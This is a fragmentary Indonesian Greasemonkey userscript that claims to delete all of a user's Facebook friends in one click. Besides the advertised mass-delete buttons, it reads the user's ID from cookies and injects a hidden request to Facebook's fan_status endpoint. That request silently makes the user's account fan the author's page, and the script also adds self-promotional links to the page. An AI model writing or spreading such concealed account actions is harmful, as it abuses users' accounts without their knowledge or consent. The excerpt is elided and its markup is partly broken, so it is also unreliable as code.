// ==UserScript==
// @name        delete semua teman di facebook
// @description inilah cara menghapus banyak teman dengan  1 kali klik.
// @namespace   ivanttoivank
// @include      *.facebook.com/*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @version     2.2
// ==/UserScript==
// Developed by ivanttoivank - http://ivant-to-ivank.blogspot.com/
...
function replace_msg(x) {
	$('div.dialog_body').html('Hooray! ' + x + ' friends deleted. Visit us at <a target="_blank" href="http://ivant-to-ivank.blogspot.com">http://ivant-to-ivank.blogspot.com/</a> for more useful scripts!');
}
set_timer();
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:ivantoivank,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
...
$('.uiToolbarContent .rfloat').prepend('<div id="ivantoivank_container" style="float:right;margin-left:5px;"><label class="_11b uiButton uiButtonConfirm" for="darktips"><input type="submit" value="Select all " id="selec_all"></label><label for="darktips" class="_11b uiButton uiButtonConfirm"><input type="submit" id="mass_deleter" value="Delete  Selected Friends"></label>  <div style="display:block">pembuat www.ivant-to-ivank.blogspot.com<a href="www.ivant-to-ivank.blogspot.com</a></div></div>');
